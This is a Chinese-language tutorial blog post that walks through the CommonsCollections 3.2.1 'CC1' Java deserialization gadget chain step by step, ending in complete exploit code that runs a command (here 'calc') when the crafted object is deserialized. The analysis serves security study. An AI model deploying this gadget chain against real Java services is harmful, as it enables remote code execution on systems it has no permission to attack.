###### tags: `Java 反序列化`
[TOC]
# Java 反序列化第 4 篇-CC1 国内版
<!--toc-->
这一篇分析 Java 反序列化 CommonsCollections 的 CC1 链。
<!--more-->

## 一. 前言
感觉国内版的 CC1 和正版 CC1 相比，还是正版 CC1 优雅一些。

关于 Common-Collections 的介绍可以直接看[闪烁之狐](https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/)大佬。

也可以看看这篇 [foxlovesecurity](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)



## 二. 环境搭建

- [JDK8u65](https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html)
- Maven 3.6.3(其余版本可以先试试，不行再降版本)

>jdk 版本要求 8u65，若用 jdk8u71，那么 CC 链的漏洞就被修掉了，所以无法进行漏洞测试。



>官网的版本管理有问题，点击 8u65 结果下的是 111。
> 一番查找发现下载网站 [Oracle JDK 8u65 全平台安装包下载 - 码霸霸 (lupf.cn)](https://blog.lupf.cn/articles/2022/02/19/1645283454543.html)

我新建了一个名为 **jdk8u65** 的文件作为我的安装目录

###  2.1 pom.xml 添加依赖

再接着，创建一个 IDEA 项目，选中 maven，并使用 jdk8u65。创建完毕之后在 pom.xml 中添加如下依赖

![](https://i.imgur.com/qgzZQ3E.png)


添加依赖之后右上角如果出现 pom 的图标，点击一下就好了。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>CC1</artifactId>
    <version>1.0-SNAPSHOT</version>
    <dependencies>
        <!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>

    </dependencies>


    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

</project>
```

如何验证环境导入成功？我们 import CC 的包

```Java
import org.apache.commons.collections.functors.InvokerTransformer;
```

如果成功说明安装成功了。之后点进去 `InvokerTransformer` 包，然后如果右上角出现了 pom 的下载源，那就下载。

![](https://i.imgur.com/kgvNpBu.png)


### 2.2 修改 sun 包

首先在我们的 jdk8u65 文件夹有一个 src.zip

![](https://i.imgur.com/4QczscE.png)


我们在这个目录新建一个文件夹 src，并将 src.zip 的内容解压到 src，之后去下面的链接下载 sun 包。

[openJDK 8u65](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4)————去到这个下载链接并点击 zip 下载

![](https://i.imgur.com/TewD2Sk.png)


下载完毕之后解压，会得到一个名为 `jdk-af660750b2f4` 的文件夹， 进入该文件夹的 `src/share/classes` 目录下，将 sun 文件夹复制到前面建立的 src 文件夹中

![](https://i.imgur.com/ESgouxG.png)


之后进入 idea，打开项目结构，将我们的 sun 文件夹添加到源路径

![](https://i.imgur.com/0XaHxAo.png)


![](https://i.imgur.com/Rx8Ey3W.png)




## 三. TransformedMap 版 CC1 攻击链分析

### 3.1 流程图

![](https://i.imgur.com/teGQw0j.png)



### 3.1 反序列化攻击思路

首先我们再次明确一下反序列化的攻击思路

- 入口类需要一个 `readObject` 方法
- 结尾需要一个能够命令执行的方法
- 从入口类出发通过链子引导到结尾命令执行，故我们的攻击应从尾部出发去寻找头部。

![](https://i.imgur.com/bL5wFN9.png)




### 3.2 InvokerTransformer.transform()

接下来就正式开始复现 CC1 的链。

首先在 idea 左侧项目找到 commons-collections-3.2.1，然后在集合模块找到 `Transformer.java` 文件。

![](https://i.imgur.com/XZQ4ddb.png)


具体是在 `org.apache.commons.collections` 包下(位置靠下，所以往下拉一拉才能看到)

![](https://i.imgur.com/0ITK3KW.png)

>网上没有人说为什么直接去 Transformer.java ，我也没懂，暂时搁置。这或许就是挖掘 Java 漏洞所要做的事情吧：找到攻击链！

![](https://i.imgur.com/Ai2jKhF.png)


这是一个接口，我们使用 `ctrl + alt + B` 查看实现了这个接口的类。

![](https://i.imgur.com/1tSU48I.png)


我看的视频和文章都是人工翻找以上的类看看有没有能执行 exec 方法的，我就省略这一步了，直接定位到 `InvokerTransformer`。 

-  发现 `InvokerTransformer` 类的 `transform` 方法存在一个反射调用任意类，所以这可以作为我们链子的终点。

![](https://i.imgur.com/0s5Annl.png)


**小练习**

>既然这里有漏洞，我们不妨先利用反射弹一个计算器玩玩。

思路就是实例化 InvokerTransformer 类并调用其 transform() 方法。

首先关注到 `InvokerTransformer` 类的构造函数如下

![](https://i.imgur.com/Thb6abJ.png)


注意到构造函数是公有的，所以我们可以直接 new 出来。

- 第一个参数是 String 类型的方法名
- 第二个参数是一个 Class 数组类型，表示方法的参数类型
- 第三个参数是一个 Object 数组类型，表示方法的参数。

首先实例化一个 **InvokerTransformer** 对象，因为我们要执行命令，所以调用的方法当然是 **exec**。

```java
InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
```

之后用 Runtime 类的实例对象作为参数调用上述对象的 transfrom 方法

```java
Runtime runtime = Runtime.getRuntime();
invokerTransformer.transform(runtime);
```

运行之后就可以弹出计算器，具体为什么可以弹计算器就不写了，可以自行分析一下。

注意到我们最后一句代码是 `invokerTransformer.transform(runtime)` ，所以我们下一步的目标就是去找调用 `InvokerTransformer.transform()` 方法的不同名函数

### 3.3 TransformedMap.checksetValue()

如上所述，现在回到 `InvokerTransformer.transform()` 方法并寻找调用了这个方法的不同名函数。IDEA 可以帮我们快速做到这一点，只需要将光标停留在这个方法上并右键点击 find usages 即可。如果 find usages 有问题的话，可以先 `Ctrl+Alt+Shift+F7`，选择 `All place` 查询。最后的结果应如下图

![](https://i.imgur.com/FEPDKTu.png)


>这里同样有一个逐个翻看调用了 transform() 方法的那些类的操作，目的是为了找到可行的链子。我节省时间故直接给出答案。

发现 `TransformedMap` 类调用了 `transform()` 方法

![](https://i.imgur.com/i1tbTVH.png)


具体地说是这个类中的 `checkSetValue()` 方法调用了 `transform()` 方法。我们右键选中然后 jump to source,源码如下：

![](https://i.imgur.com/uYfW631.png)

我们肯定是想让上图的 `valueTransformer` 是一个 `InvokerTransformer` 类对象。所以接下来我们去看一看 `valueTransformer` 是什么东西，最终在 `TransformedMap` 的成员变量中发现了 `valueTransformer`

![](https://i.imgur.com/K8N3Gjv.png)

喔，原来这是一个 Transformer 接口。那我们的 InvokerTransformer 作为实现了这个接口的类肯定是可以和该变量兼容的。
那我们就尝试寻找该变量是否存在可控点，最后在 TransformedMap 类的构造函数中发现可以设置这个变量的值，如下图：

![](https://i.imgur.com/54XRKeh.png)


- 因为 `TransformedMap` 的构造方法作用域是 `protected`，所以我们还需要去找一找谁调用了 `TransformedMap` 的构造方法。

发现在 `TransformedMap.decorate()` 静态方法中创建了 `TransformedMap` 对象

![](https://i.imgur.com/ZcfoGRE.png)

那我们的思路就清晰了，通过调用 `TransformedMap.decorate()` 将 valueTransformer 赋值为 InvokerTransformer 类对象，并通过反射调用 `TransformedMap.checkSetValue()` 方法，传入的参数是一个 Runtime 类对象。这样一来就完成了命令执行弹出计算器的构造。
代码如下：

```java
public static void main(String[] args) throws Exception {
        // 实例化一个 InvokerTransformer 对象
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
//
        Runtime runtime = Runtime.getRuntime();

        HashMap<String,String> hashMap = new HashMap<>();
        
        // decorate 方法的返回类型是 Map
        Map transformedMap =  TransformedMap.decorate(hashMap,null,invokerTransformer);

        // checkSetValue 方法是 protected，所以接下来要通过反射调用这个方法

        Class c = TransformedMap.class;
        Method method = c.getDeclaredMethod("checkSetValue",Object.class);
        method.setAccessible(true);
        method.invoke(transformedMap,runtime);


    }
```


### 3.4 MapEntry.setValue()

紧接上文，现在寻找谁调用了 TransformedMap.checkSetValue()。

一番查找发现 **AbstractInputCheckedMapDecorator$MapEntry.setValue()** 方法调用了 `checkSetValue()` 方法（更具体地说是该方法的 `parent.checkSetValue(value);` 语句调用了 `checkSetValue()`）

![](https://i.imgur.com/szsmJYM.png)

![](https://i.imgur.com/XSAe74Y.png)

这个方法是公有的，说明我们可以直接调用它，并且可以看到该方法接收的 value 参数传入了 `parent.checkSetValue()` 方法，根据我们上文的分析，这个 value 显然应是一个 Runtime 类实例对象。我们肯定是希望 `parent` 变量是一个 `TransformedMap` 类对象，这样一来只需要调用到 setValue() 方法就可以续上我们之前的链子了。

从上图 MapEntry 类的构造函数我们可以控制 `parent` 变量的值。

可以看到 `parent` 变量是一个`AbstractInputCheckedMapDecorator` 类对象，好在 `AbstractInputCheckedMapDecorator` 类是 `TransformedMap` 类的父类，所以我们只需要将 `parent` 变量赋值为 `TransformedMap` 类对象即可。（子类赋值给父类是没问题的）

>`AbstractInputCheckedMapDecorator` 是一个抽象类，并且是 `TransformedMap` 的父类。![](https://i.imgur.com/iCrZa4l.png)
> 这里和之前是一样的，都涉及到 Java 的父子类转化、兼容问题，可以自行百度搜一下相关知识点



### 3.5 AbstractInputCheckedMapDecorator.entrySet()

在这里我们不再去寻找谁调用了 setValue方法，而是直接实例化 `MapEntry` 类直接调用它。
>我不知道这一步为什么突然变了，极有可能是因为 MapEntry 是一个内部类的原因。

那么如何实例化 `MapEntry` 类对象？

答：只需要调用 AbstractInputCheckedMapDecorator 类的 entrySet() 方法就得到一个 EntrySet 类的实例对象，然后进行遍历就可以实现。（具体为什么可以打断点分析）

**小练习**
根据当前的链子书写利用代码。

思路：
因为遍历的时候可以获得一个 MapEntry 类对象，我们调用其 `setValue()` 方法并传入一个 Runtime 实例对象就可以完成链子的构造。


**我的代码：**
```java
public static void main(String[] args) throws Exception {
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec"
                , new Class[]{String.class}, new Object[]{"calc"});
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("key", "value");
        Map<Object, Object> decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);
        // decorateMap 是一个 TransformedMap 类对象 （class org.apache.commons.collections.map.TransformedMap）
        for (Map.Entry entry:decorateMap.entrySet()){
            entry.setValue(runtime);

        }

    }
```





>你可以写一段代码来调试一下，看一看在遍历 Map 的时候，会不会走到 `setValue` 中。在 `setValue` 的 192 行打个断点，并修改一下我们的 Poc。更具体的可以打断点慢慢分析，这里涉及到外部类调用内部类、内部类又去调用自己的子类等，过程特别冗长，不分析下去了。

运行完之后就可以弹计算器出来！

到这一步我们的 POC 马上就要出来了，就差一个 `readObject` 了。接下来要做的事情就是找到一个 `readObject` 并且里面调用了 `setValue()` 方法

### 3.5 AnnotationInvocationHandler.readObejct()

- 之前链子是到 `AbstractInputCheckedMapDecorator$MapEntry.setValue()` 的，所以我们在 `setValue()` 处，find usages

不多说，下图直接给出我们 readObject 的入口类：

![](https://i.imgur.com/9Jy64av.png)


我们的链首位于 **AnnotationInvocationHandler.readObejct()**

> 这个 readObject 是在进行 Map 遍历的时候调用的 setValue 方法，该说不说这简直完美契合我们之前的链子，难怪被大佬们拿来作为入口类！

![](https://i.imgur.com/Z8DZnJI.png)


上图 444 行的 `memberValues.entrySet()`和 451行的 `memberValue.setValue()` 就是我们链子的触发点。

我们可以在 **AnnotationInvocationHandler** 类的构造函数中设置 memberValues  的值，若我们让 memberValues 是一个 TransformedMap 类对象，那么 memberValues.entrySet() 就会得到一个 AbstractInputCheckedMapDecorator$**MapEntry**，若能调用到这个对象的 setValue 方法，我们就可以完成整个整个漏洞的利用链了。

![](https://i.imgur.com/l8rscpG.png)


从上图可以看到 AnnotationInvocationHandler 的作用域为 `default`，所以我们需要通过反射的方式来获取这个类及其构造函数。

现在我们就是想调用 AbstractInputCheckedMapDecorator$**MapEntry** 类对象的 setValue 方法，在 451 行我们可以做到这一点。然而，阅读一下代码就会发现有两个 if 判断会阻拦我们进入 setValue 方法

![](https://i.imgur.com/AgEwKPE.png)


接下来说说如何绕过这两个 if！

#### 3.5.1 如何通过第一个 if

仔细阅读代码可以发现第一个 if 中的 memberType 其调用链如下：

> annotationType = AnnotationType.getInstance(type); // type 是什么？
>
> Map<String, Class<?>> memberTypes = annotationType.memberTypes();
>
> Class<?> memberType = memberTypes.get(name);  // name 是什么？

下图的代码告诉我们 **type** 是一个和 Annotation 有关的 Class 类对象

![](https://i.imgur.com/zia9YYP.png)


跟进到 AnnotationType.getInstance，该方法对于一个给定的注解类会返回其实例（顾名思义），参数是一个 Class 类型

示例如下：

![](https://i.imgur.com/UIrB8rz.png)

为绕过 if 判断，我们需要让 type 变量为恰当的值，幸运地是：**type** 的值可以在构造函数中定义，具体需要什么值，还需要继续分析。

![](https://i.imgur.com/sAxqWUB.png)

根据上文的调用链，AnnotationType.getInstance() 返回某个注解类型的实例之后，紧接着调用该实例的 memberTypes() 方法，并且返回类型是 Map。（忘记了调用关系就看看下图 (●'◡'●)）

![](https://i.imgur.com/ylI0Dti.png)


跟进到 memberTypes()，这个方法会返回注解类型的 **member type**，是一个 Map。

![](https://i.imgur.com/qAc3U1e.png)


我们传入 Target 注解来看看实际的样子：

首先 Taget 注解的定义如下：

![](https://i.imgur.com/VW4T5EB.png)


然后输出一下其 member type：

![](https://i.imgur.com/1ravNKd.png)




在上一步调用 .memberTypes() 方法后返回一个 Map 类对象后，我们最后是对这个 Map 进行了一个查询操作，具体地说是传入了一个 name 作为 Map 类对象的 key。若查询到了对应的 value，我们就可以通过第一个 if。

![](https://i.imgur.com/231ueKO.png)


name 是什么呢？ name 是 memberValue 这个 entry 的 key，而此 entry 又来自于我们可控的 memberValues。而我们可以构造任意键值的 entry,所以问题的关键在于找到一个具有成员变量的注解类型 memberTypes ,使其调用.get(name) 不为空，这样我们就可以通过第一个 if 判断。

而前面示例中的 **Target** 就符合这样的条件,其有一个名为 value 的成员变量.

所以若在构造函数中让 type 为 Taget.class，那我们的 memberTypes 就为

>{value=class [Ljava.lang.annotation.ElementType;}

其键为 value，值为 class [Ljava.lang.annotation.ElementType;}

所以我们构造出一个键为 value 的 entry 即可

这样 memberTypes.get(value) 就等于 class [Ljava.lang.annotation.ElementType;}。

所以最后我们可以如下构造 AnnotationInvocationHandler 类对象（不要忘记这个类是 default 修饰符修饰的，所以要通过反射调用）

```java=
InvokerTransformer invokerTransformer = new InvokerTransformer("exec"
                    , new Class[]{String.class}, new Object[]{"calc"});
            HashMap<Object, Object> hashMap = new HashMap<>();
            hashMap.put("value", "xxx"); //关键点
Map<Object, Object> decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);

Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class,decorateMap);
```

运行之后打断点示例如下，明显此时可以过第一个 if

![](https://i.imgur.com/wCddCWu.png)


#### 3.5.2 第二个 if

巧合地是，我们过第一个 if 的代码同时也能过第二个 if。

```java
Object value = memberValue.getValue();
if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {}
```

isInstance(value) 就是判断 value 是否是memberType 的一个实例,如果是就返回真。我们肯定是希望其返回假，然后外层取反总体为真，这样就可以通过第二个 if了。那关键点就在 value 身上，value 是什么呢？ value 其实就是 当前 entry 的值(根据上文，现在的 entry 的键是等于 "value" 这个字符串，不要和现在的这个 value 变量弄混淆了),而我们是可以控制 entry 的，所以我们可以控制 value！

根据我们过第一个 if 所做的操作，memberType 的值为

  `class [Ljava.lang.annotation.ElementType;}`

所以我们随便写一个字符串进去就可以让 isInstance 返回假,这样外层再取反直接为真通过第二个 if!

如下图我们显然已经调用到了 setValue 函数

![](https://i.imgur.com/HaAVu51.png)




现在我们来到了最后一个问题，那就是 `setValue()` 传入的参数值的问题。

### 3.6 setValue() 传入的参数值

过了这两个 if 还是不能弹出计算器，因为进去两个 if之后的 setValue 参数值不对。最后传入的是一大串奇怪的东西：
用上面的断点代码跟进一下看看 AbstractInputCheckedMapDecorator 类的 setValue 方法的参数值是什么

![](https://i.imgur.com/ExnU33t.png)

根据前面的分析我们可以知道，若想弹出计算器，那么在调用 setValue() 方法的时候应该传入的是一个 Runtime 类的对象，而这里显然不是。所以我们该如何使得在调用 setValue() 方法时传入的是一个 Runtime 类对象呢？很显然我们没办法做到这一点，但是我们的最终目的是在调用 `invokerTransformer.transform()` 方法的时候能够传入一个 Runtime 类对象。但当前我们传入的是一个 AnonotationType 啥的对象，那有什么办法能够改变传入的对象吗？答案是有的！

![](https://i.imgur.com/bwdPwQo.png)


- 我们这里找到了两个能够解决实现上述目的可控参数的类 ———— `ConstantTransformer` 和 `ChainedTransformer`。

**ConstantTransformer 类定义如下：**

![](https://i.imgur.com/K39IOjJ.png)

- 构造方法：传入的任何对象都放在 `iConstant` 中
- `transform()` 方法：无论传入什么，都返回 `iConstant`，这就类似于一个常量了。

**ChainedTransformer 类定义如下：**

![](https://i.imgur.com/yXu8ra9.png)

从上图我们可以看到 ChainedTransformer 类的 transform 方法可以改变传入的对象。因为如果我们令当前的 iTransformers 是一个 ConstantTransformer 实例（构造函数传入一个 RUntime 类对象），然后 object 是一个 AnnotationTypexxx 对象，那么根据 ConstantTransformer 的 transform 方法，我们不就成功地得到了一个 Runtime 类对象吗？并且我们还可以看到 ChainedTransformer 类是递归地调用 transform 方法的，所以我们紧接着就会调用下一轮的 transfrom 方法，不过此时传入的对象是 Runtime 类对象，而 iTransformers 是一个我们可控的 Transformer 数组，所以我们可以让第二轮的 iTransformers 为一个 InvokerTransformer 类对象，那这样不就调用到 `InvokerTransformer.transfrom(runtime)` 了吗？这完美符合我们前面的调用链。

根据以上分析我们就完美的构造了一条链子出来，现在尝试编写代码

```java=
public static void main(String[] args) throws Exception{

                Runtime runtime = Runtime.getRuntime();
                InvokerTransformer invokerTransformer = new InvokerTransformer("exec"
                        , new Class[]{String.class}, new Object[]{"calc"});
                HashMap<Object, Object> hashMap = new HashMap<>();
                hashMap.put("value", "xxx");

                ConstantTransformer constantTransformer = new ConstantTransformer(runtime); //错误代码，Runtime类不能序列化，所以后续会报错
                Transformer[] transformers = {constantTransformer,invokerTransformer};

                ChainedTransformer chainedTransformer  =new ChainedTransformer(transformers);


                Map<Object, Object> decorateMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
                // decorateMap 是一个 TransformedMap 类对象 （class org.apache.commons.collections.map.TransformedMap）
             
                Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
                Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);
                constructor.setAccessible(true);

                Object o = constructor.newInstance(Target.class,decorateMap);
                serialize(o);
                unserialize("ser.bin");


        }



public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
        }
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();

        return obj;
        }
        
```

然而运行缺报错了

![](https://i.imgur.com/NRiJWSm.png)


> 原因是 Runtime 类对象不能反序列化

好在 Runtime.class 是可以序列化的，还记得 `InvokerTransformer.transform()` 方法的源码吗？

![](https://i.imgur.com/aTH9nyH.png)

这个方法首先会获取传入的对象的原型类并基于该原型类得到传入的对象所属类的某个方法，最后在传入的对象上调用这个方法并返回。只要传入一个Runtime 类的实例对象，就可以弹计算器。所以现在我们需要在给 InvokerTransform.transform() 方法传入一个 Runtime.class 对象的情况下，通过 ChainedTransformer 得到一个 Runtime 类对象并最终将该对象传入 InvokerTransform.transform() 完成命令执行。

如何实现这一点呢？这是一个有些复杂的问题，也是 CC1 的 POC 中最后的拼图，解决了它就彻底完成了 CC1 的复现。我们肯定是通过 ChainedTransformer 来做到这一点，所以问题的关键点在于如何构造 ChainedTransformer 的 Transformer 数组，使得在多次调用 `InvokerTransformer.transform()` 方法时最终可以传入一个 Runtime 类实例对象。



首先看看如何通过正常的反射得到 Runtime 类对象：

```java=
Class c = Runtime.class;

Method getRuntimeMethod = c.getMethod("getRuntime",null);//方法名、方法的参数类型。因为 getRuntime() 方法是无参方法，所以参数类型为空。
Runtime r = (Runtime) getRuntimeMethod.invoke(null,null);//getRuntime 是一个静态的无参方法

Method execMethod = c.getMethod("exec",String.class);
execMethod.invoke(r,"calc");
```
由于传入的是 Runtime.class ，所以会拿到 Runtime.class 的原型类，这也是一个 class 对象，不过是属于 java.lang.Class 的。
根据以上的反射代码，我们是需要获取到 Runtime.class 的 getMethod() 方法，传入的参数是 "getRuntime()"。
Runtime.class.class 的 getMethod() 方法定义如下：

![](https://i.imgur.com/Et7kJ2x.png)


那通过 Runtime.class.class（Runtime.class 的原型类） 获取 Runtime.class.getMethod("getRuntime") 应该这么写：
```java=
Class c = Runtime.class;
System.out.println(c);
System.out.println(c.getClass());

Class c1 = c.getClass();

Method method = c1.getMethod("getMethod",new Class[]{String.class,Class[].class});
Method m2 = (Method)method.invoke(c,new Object[]{"getRuntime",null});

System.out.println( (method.invoke(c,new Object[]{"getRuntime",null})));
System.out.println( (method.invoke(c,new Object[]{"getRuntime",null})).getClass()); // 获取到了 Runtime.class 的 getRuntime 方法
```
![](https://i.imgur.com/OHdDLzi.png)

接下来通过 getRuntime() 的原型类获取 invoke 方法并调用，从而拿到 Runtime 类实例对象
```java=
 // 目标是通过 getRuntime() 的原型类调用invoke,最后会得到一个Runtime 类对象
        Class cls = m2.getClass();
        System.out.println(cls);
        Method m3 = cls.getMethod("invoke",new Class[]{Object.class,Object[].class});
        System.out.println(m3);
        System.out.println(m3.invoke(m2,new Class[]{null,null}));
```
![](https://i.imgur.com/Mk4CluH.png)






最后的 exp 如下：

```java=
package org.example;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;


public class Main {

        public static void main(String[] args) throws Exception{
                
                HashMap<Object, Object> hashMap = new HashMap<>();
                hashMap.put("value", "xxx");
                
                Transformer[] transformers = new Transformer[]{
                        new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数
                        
                        // 方法名、参数类型、参数值
                        new InvokerTransformer("getMethod",
                                new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),

                        new InvokerTransformer("invoke"
                                , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),

                        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
                };

                ChainedTransformer chainedTransformer  =new ChainedTransformer(transformers);


                Map<Object, Object> decorateMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
                // decorateMap 是一个 TransformedMap 类对象 （class org.apache.commons.collections.map.TransformedMap）

                Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
                Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);
                constructor.setAccessible(true);



                Object o = constructor.newInstance(Target.class,decorateMap);
                serialize(o);
                unserialize("ser.bin");




        }



public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
        }
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();

        return obj;
        }
        }
```
**核心代码**：

![](https://i.imgur.com/tZD07at.png)


在 ChainedTransforme r的循坏中打断点分析一下

第一轮：

![](https://i.imgur.com/qOHn4Np.png)




第二轮：

![](https://i.imgur.com/5w7biRC.png)

![](https://i.imgur.com/SFjEGPQ.png)




第三轮：

![](https://i.imgur.com/E8Cz3AS.png)

![](https://i.imgur.com/8vUXa9B.png)




第四轮：

已经拿到 Runtime 类实例对象，直接执行 exec 方法

![](https://i.imgur.com/wz6ATGK.png)

![](https://i.imgur.com/BGdkZKW.png)




>完结撒花！！第一次分析 Java 经典反序列化链子，还有很多不成熟的地方，但是我已经进步良多。

## 四. 参考链接

[白日梦组长大佬](https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&vd_source=ed636173e6c328be468a244d33ee03e1)

[java反序列化(三)CommonsCollections篇 -- CC1](https://www.cnblogs.com/h0cksr/p/16189755.html)

[Java安全之反序列化篇-URLDNS&Commons Collections 1-7反序列化链分析](https://paper.seebug.org/1242/#commons-collections)